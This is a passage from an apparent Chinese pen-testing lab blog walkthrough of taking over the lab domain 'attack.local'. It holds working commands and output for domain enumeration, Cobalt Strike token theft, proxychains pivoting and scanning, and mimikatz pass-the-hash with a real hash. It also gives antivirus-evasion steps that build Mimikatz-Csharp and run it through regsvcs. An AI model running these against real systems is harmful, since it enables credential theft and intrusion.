class="title">accounts</span> <span class="title">for</span> \\<span class="title">dc.attack.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>            <span class="title">DefaultAccount</span>           <span class="title">Guest</span></span></span><br><span class="line"><span class="function"><span class="title">krbtgt</span>                   <span class="title">oa</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">with</span> <span class="title">one</span> <span class="title">or</span> <span class="title">more</span> <span class="title">errors</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">myoa</span>\<span class="title">nginx</span>&gt;<span class="title">net</span> <span class="title">group</span> /<span class="title">domain</span>                              #查看域控所在的组</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">request</span> <span class="title">will</span> <span class="title">be</span> <span class="title">processed</span> <span class="title">at</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span> <span class="title">for</span> <span class="title">domain</span> <span class="title">attack.local</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">Accounts</span> <span class="title">for</span> \\<span class="title">dc.attack.local</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function">*<span class="title">Cloneable</span> <span class="title">Domain</span> <span class="title">Controllers</span></span></span><br><span class="line"><span class="function">*<span class="title">DnsUpdateProxy</span></span></span><br><span class="line"><span class="function">*<span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function">*<span class="title">Domain</span> <span class="title">Computers</span></span></span><br><span class="line"><span class="function">*<span class="title">Domain</span> <span class="title">Controllers</span></span></span><br><span class="line"><span class="function">*<span class="title">Domain</span> <span class="title">Guests</span></span></span><br><span class="line"><span class="function">*<span class="title">Domain</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Enterprise</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function">*<span class="title">Enterprise</span> <span class="title">Key</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function">*<span class="title">Enterprise</span> <span class="title">Read</span>-<span class="title">only</span> <span class="title">Domain</span> <span class="title">Controllers</span></span></span><br><span class="line"><span class="function">*<span class="title">Group</span> <span class="title">Policy</span> <span class="title">Creator</span> <span class="title">Owners</span></span></span><br><span class="line"><span class="function">*<span class="title">Key</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function">*<span class="title">Protected</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Read</span>-<span class="title">only</span> <span class="title">Domain</span> <span class="title">Controllers</span></span></span><br><span class="line"><span class="function">*<span class="title">Schema</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">with</span> <span class="title">one</span> <span class="title">or</span> <span class="title">more</span> <span class="title">errors</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">myoa</span>\<span class="title">nginx</span>&gt;<span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> /<span class="title">domain</span>         #查看登录域内的<span class="title">administrator</span>用户</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span> /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">request</span> <span class="title">will</span> <span class="title">be</span> <span class="title">processed</span> <span class="title">at</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span> <span class="title">for</span> <span class="title">domain</span> <span class="title">attack.local</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        ▒▒▒▒Ա▒Լ▒▒▒▒/▒▒▒в▒▒▒▒▒▒Ƶ▒▒▒ȫ▒▒▒▒Ȩ</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">Enterprise</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">myoa</span>\<span class="title">nginx</span>&gt;<span class="title">net</span> <span class="title">group</span> &quot;<span class="title">domain</span> <span class="title">admins</span>&quot; /<span class="title">domain</span>              #查看域内的<span class="title">admini</span>用户</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> &quot;<span class="title">domain</span> <span class="title">admins</span>&quot; /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">request</span> <span class="title">will</span> <span class="title">be</span> <span class="title">processed</span> <span class="title">at</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span> <span class="title">for</span> <span class="title">domain</span> <span class="title">attack.local</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">name</span>     <span class="title">Domain</span> <span class="title">Admins</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        ָ▒▒▒▒▒▒▒▒▒Ա</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">myoa</span>\<span class="title">nginx</span>&gt;<span class="title">net</span> <span class="title">group</span> &quot;<span class="title">domain</span> <span class="title">controllers</span>&quot; /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> &quot;<span class="title">domain</span> <span class="title">controllers</span>&quot; /<span class="title">domain</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">request</span> <span class="title">will</span> <span class="title">be</span> <span class="title">processed</span> <span class="title">at</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span> <span class="title">for</span> <span class="title">domain</span> <span class="title">attack.local</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">name</span>     <span class="title">Domain</span> <span class="title">Controllers</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">DC</span>$</span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
<h6 id="查看域控管理员登录"><a class="markdownIt-Anchor" href="#查看域控管理员登录"></a> 查看域控管理员登录</h6>
<p>我们能知道现在目标机器是在attack.local的域控中的</p>
<p>查看用户进程</p>
<p><img src="https://s2.loli.net/2022/05/18/EBRnxpTra3YCWfU.png" alt="image-20220130213615582" /></p>
<h3 id="拿到域控管理员"><a class="markdownIt-Anchor" href="#拿到域控管理员"></a> 拿到域控管理员</h3>
<p>我们在OA主机发现是由域控的aministrator用户在线的</p>
<h4 id="使用命令窃取进程"><a class="markdownIt-Anchor" href="#使用命令窃取进程"></a> 使用命令窃取进程</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token 3628</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/18/yXF3mt6McY2ezU5.png" alt="" /></p>
<h4 id="尝试建立administrator的用户shell"><a class="markdownIt-Anchor" href="#尝试建立administrator的用户shell"></a> 尝试建立administrator的用户shell</h4>
<p><img src="https://s2.loli.net/2022/05/19/hDP45fAdKk2ijvQ.png" alt="" /></p>
<h5 id="无法建立会话"><a class="markdownIt-Anchor" href="#无法建立会话"></a> 无法建立会话</h5>
<h4 id="尝试访问dc的c盘"><a class="markdownIt-Anchor" href="#尝试访问dc的c盘"></a> 尝试访问dc的c盘</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/sa9vGfYqckH5ugl.png" alt="image-20220130174438083" /></p>
<h5 id="无法访问"><a class="markdownIt-Anchor" href="#无法访问"></a> 无法访问</h5>
<p>这样的administrator是没有意义的、我们暂时先取消刚刚窃取的administrato的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev2self</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/VemXQ6akHFltB4N.png" alt="image-20220130174729508" /></p>
<h4 id="cs建立shell"><a class="markdownIt-Anchor" href="#cs建立shell"></a> CS建立shell</h4>
<p>上面我们使用msf是无法创建shell窗口的、这里使用cs尝试</p>
<p><img src="https://s2.loli.net/2022/05/19/CK9JcSlIzTepM1R.png" alt="image-20220130220554451" /></p>
<p>是可以建立shell的</p>
<h5 id="尝试访问文件"><a class="markdownIt-Anchor" href="#尝试访问文件"></a> 尝试访问文件</h5>
<p>可以放问attack域控的文件的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">beacon&gt; shell dir \\dc\c$</span><br><span class="line">[*] Tasked beacon to run: dir \\dc\c$</span><br><span class="line">[+] host called home, sent: 42 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\dc\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 FEFA-8711</span><br><span class="line"></span><br><span class="line"> \\dc\c$ 的目录</span><br><span class="line"></span><br><span class="line">2016/07/16  21:23    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020/07/14  14:12    &lt;DIR&gt;          Program Files</span><br><span class="line">2016/07/16  21:23    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020/07/14  14:07    &lt;DIR&gt;          Users</span><br><span class="line">2020/08/09  09:35    &lt;DIR&gt;          Windows</span><br><span class="line">               0 个文件              0 字节</span><br><span class="line">               5 个目录 52,490,985,472 可用字节</span><br><span class="line"></span><br><span class="line">beacon&gt; shell whoami</span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">attack\administrator</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接就拿到下了域控、没意思、这不是我们想要的、、、、、、、、</p>
<p>下面继续使用MSF进行攻击、因为又的时候CS的免杀攻击木马是不好做出来的、所以还是尽量的模仿真是的攻击环境比较好</p>
<h3 id="访问域控信息"><a class="markdownIt-Anchor" href="#访问域控信息"></a> 访问域控信息</h3>
<h4 id="添加路由"><a class="markdownIt-Anchor" href="#添加路由"></a> 添加路由</h4>
<p>在10.10.1.130的机器上在添加一条10.10.10.0/24的静态路由、以便我们访问域控的10.10.10.的机器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.10.10.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/UJxkTQvRdnDFE98.png" alt="image-20220130175024050" /></p>
<h4 id="访问域控主机"><a class="markdownIt-Anchor" href="#访问域控主机"></a> 访问域控主机</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ping 10.10.10.165</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/XJRygPwzOMTD69B.png" alt="image-20220130175121223" /></p>
<h4 id="主机扫描"><a class="markdownIt-Anchor" href="#主机扫描"></a> 主机扫描</h4>
<h5 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sudo masscan -p 1-65535 10.10.10.165 --rate=500</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/XLyFS7fNvlM2Y84.png" alt="image-20220130175740521" /></p>
<p>或者使用nmap进行常用端口的探测扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 10.10.1.130 -p 80,89,8000,9090,1433,1521,3306,5432,445,135,443,873,5984 ,6379,7001,7002,9200,9300,11211,27017,27018 ,50000,50070,50030,21,22,23,2601,3389 --open</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/sGwl9fYXZ8UpkOK.png" alt="" /></p>
<p>3389端口是开放的</p>
<h4 id="获取域用户的pid-sid的ntml"><a class="markdownIt-Anchor" href="#获取域用户的pid-sid的ntml"></a> 获取域用户的PID  SID的NTML</h4>
<h5 id="管理员"><a class="markdownIt-Anchor" href="#管理员"></a> 管理员</h5>
<p>这个获取是使用mimikatz工具的命令的、（只有域管理员才能拿到）</p>
<p><img src="https://s2.loli.net/2022/05/19/HrYCp5klDnhUzGP.png" alt="image-20220130213823343" /></p>
<p><img src="https://s2.loli.net/2022/05/19/xO98EzlIBMkUR7H.png" alt="image-20220130213715843" /></p>
<h5 id="krbtgt"><a class="markdownIt-Anchor" href="#krbtgt"></a> krbtgt</h5>
<p><img src="https://s2.loli.net/2022/05/19/Vcx3PawZGJzKTDe.png" alt="image-20220130214113513" /></p>
<h3 id="登录域控管理员"><a class="markdownIt-Anchor" href="#登录域控管理员"></a> 登录域控管理员</h3>
<h4 id="pth登录域管理"><a class="markdownIt-Anchor" href="#pth登录域管理"></a> pth登录域管理</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">参考学习：</span><br><span class="line">https://www.anquanke.com/post/id/152956</span><br><span class="line">https://www.cnblogs.com/feizianquan/p/11764344.html</span><br><span class="line">https://yoga7xm.top/2019/04/12/IPentest-domain3/</span><br><span class="line">https://www.geekby.site/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/     #这个方法多</span><br><span class="line">使用cs</span><br><span class="line">https://blog.csdn.net/lhh134/article/details/104475026</span><br><span class="line">https://www.anquanke.com/post/id/235251#h2-17</span><br></pre></td></tr></table></figure>
<h5 id="在cs的环境下"><a class="markdownIt-Anchor" href="#在cs的环境下"></a> 在CS的环境下</h5>
<h6 id="执行命令"><a class="markdownIt-Anchor" href="#执行命令"></a> 执行命令</h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:attack.local /ntlm:c7078b8300f0eacbffe68981cc733ee4 /run:&quot;cmd -w hidden&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/nKFNEeqUWGzHrcl.png" alt="image-20220130222016655" /></p>
<h6 id="窃取进程"><a class="markdownIt-Anchor" href="#窃取进程"></a> 窃取进程</h6>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token 3584</span><br><span class="line"></span><br><span class="line">shell dir \\dc\c$</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/xcQ6K2MpeuwqCvm.png" alt="image-20220130222058829" /></p>
<h6 id="成功访问attack域控的shell"><a class="markdownIt-Anchor" href="#成功访问attack域控的shell"></a> 成功访问attack域控的shell</h6>
<p>过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell dir \\dc\c$</span><br><span class="line">[*] Tasked beacon to run: dir \\dc\c$</span><br><span class="line">[+] host called home, sent: 66 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br><span class="line"></span><br><span class="line">beacon&gt; mimikatz sekurlsa::pth /user:administrator /domain:attack.local /ntlm:c7078b8300f0eacbffe68981cc733ee4 /run:&quot;cmd -w hidden&quot;</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s sekurlsa::pth /user:administrator /domain:attack.local /ntlm:c7078b8300f0eacbffe68981cc733ee4 /run:&quot;cmd -w hidden&quot; command</span><br><span class="line">[+] host called home, sent: 787055 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">user	: administrator</span><br><span class="line">domain	: attack.local</span><br><span class="line">program	: cmd -w hidden</span><br><span class="line">impers.	: no</span><br><span class="line">NTLM	: c7078b8300f0eacbffe68981cc733ee4</span><br><span class="line">  |  PID  3584</span><br><span class="line">  |  TID  4368</span><br><span class="line">  |  LSA Process is now R/W</span><br><span class="line">  |  LUID 0 ; 31223186 (00000000:01dc6d92)</span><br><span class="line">  \_ msv1_0   - data copy @ 0000005B4E0587C0 : OK !</span><br><span class="line">  \_ kerberos - data copy @ 0000005B4E09AA78</span><br><span class="line">   \_ aes256_hmac       -&gt; null             </span><br><span class="line">   \_ aes128_hmac       -&gt; null             </span><br><span class="line">   \_ rc4_hmac_nt       OK</span><br><span class="line">   \_ rc4_hmac_old      OK</span><br><span class="line">   \_ rc4_md4           OK</span><br><span class="line">   \_ rc4_hmac_nt_exp   OK</span><br><span class="line">   \_ rc4_hmac_old_exp  OK</span><br><span class="line">   \_ *Password replace @ 0000005B4E0910A8 (16) -&gt; null</span><br><span class="line"></span><br><span class="line">beacon&gt; steal_token 3584</span><br><span class="line">[*] Tasked beacon to steal token from PID 3584</span><br><span class="line">[+] host called home, sent: 12 bytes</span><br><span class="line">[+] Impersonated OA\Administrator</span><br><span class="line">beacon&gt; shell dir \\dc\c$</span><br><span class="line">[*] Tasked beacon to run: dir \\dc\c$</span><br><span class="line">[+] host called home, sent: 42 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\dc\c$ 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 FEFA-8711</span><br><span class="line"></span><br><span class="line"> \\dc\c$ 的目录</span><br><span class="line"></span><br><span class="line">2016/07/16  21:23    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020/07/14  14:12    &lt;DIR&gt;          Program Files</span><br><span class="line">2016/07/16  21:23    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020/07/14  14:07    &lt;DIR&gt;          Users</span><br><span class="line">2020/08/09  09:35    &lt;DIR&gt;          Windows</span><br><span class="line">               0 个文件              0 字节</span><br><span class="line">               5 个目录 52,490,973,184 可用字节</span><br><span class="line"></span><br><span class="line">beacon&gt; shell whoami</span><br><span class="line">[*] Tasked beacon to run: whoami</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">oa\administrator</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="使用mimikatz"><a class="markdownIt-Anchor" href="#使用mimikatz"></a> 使用mimikatz</h5>
<h6 id="上传mimikatz"><a class="markdownIt-Anchor" href="#上传mimikatz"></a> 上传mimikatz</h6>
<p>由于有360的存在这里需要进行免杀处理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz-csharp</span><br><span class="line">https://github.com/ssssanr/Mimikatz-Csharp</span><br><span class="line">mimikatz源码</span><br><span class="line">https://github.com/gentilkiwi/mimikatz</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/9Bvu2G7MW5wXOH8.png" alt="" /></p>
<p>三步即可</p>
<p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$key = &#x27;BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">将生成的key文件“key.snk”复制到：C:\Windows\Microsoft.NET\Framework\v4.0.30319 </span><br><span class="line"></span><br><span class="line">然后将下载的“katz.cs”也复制到：C:\Windows\Microsoft.NET\Framework\v4.0.30319</span><br><span class="line"></span><br><span class="line">运行csc.exe执行命令</span><br><span class="line">csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:regsvcs.dll /keyfile:key.snk /unsafe katz.cs</span><br><span class="line"></span><br><span class="line">然后就会输出文件“regsvcs.dll”</span><br><span class="line"></span><br><span class="line">建议是在windows server 2012这样的老机器上运行的一般win10运行会出错</span><br><span class="line">如果运行的时候错误说缺少“System.IO.Compression.dll”文件、我们只需要去下载即可</span><br><span class="line"></span><br><span class="line">运行regsvcs.dll</span><br><span class="line"></span><br><span class="line">regsvcs.exe regsvcs.dll     #即可</span><br></pre></td></tr></table></figure>
<p>将生成的dll文件上传至10.10.1.130的机器上</p>
<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll</span><br><span class="line">x64</span><br><span class="line">    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe regsvcs.dll    #用这个就行</span><br><span class="line">[OR]</span><br><span class="line">    C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe regsvcs.dll</span><br><span class="line">    C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U regsvcs.dll</span><br><span class="line">    C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U regsvcs.dll</span><br><span class="line">    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U regsvcs.dll</span><br><span class="line">    </span><br><span class="line">执行完毕后就会在本此shell会话中生成mimikatz的会话</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/J61vCFb7tBdYkRn.png" alt="image-20220130231914855" /></p>
<p>结果</p>
<p><img src="https://s2.loli.net/2022/05/19/VREmbIF2HMCJvPq.png" alt="image-20220130232024079" /></p>
<p>执行命令进行pth</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:attack.local /ntlm:c7078b8300f0eacbffe68981cc733ee4 /run:&quot;cmd -w hidden&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/05/19/Ju3TndFPqUfSwDH.png" alt="image-20220130232401959" /></p>
<p>这里是没有成功的、pth并没有完整的执行的、只有这样才是正确执行的</p>
<p><img src="https://s2.loli.net/2022/05/19/AYuilWZrFx2yMcT.png" alt="image-20220130232954737" /></p>
<p>我们也可以尝试迁移进程</p>
<p><img src="https://s2.loli.net/2022/05/19/KSQoZqIgekYyVDA.png" alt="image-20220130233059221" /></p>
<h5 id="在msf环境下使用windowssmbpsexec"><a class="markdownIt-Anchor" href="#在msf环境下使用windowssmbpsexec"></a> 在MSF环境下使用windows/smb/psexec</h5>
<h6 id="条件"><a class="markdownIt-Anchor" href="#条件"></a> 条件：</h6>
<p>①开启445端口SMB服务（默认开启）</p>
<p>②开启admin$共享</p>
<h6 id="设置监听"><a class="markdownIt-Anchor" href="#设置监听"></a> 设置监听</h6>
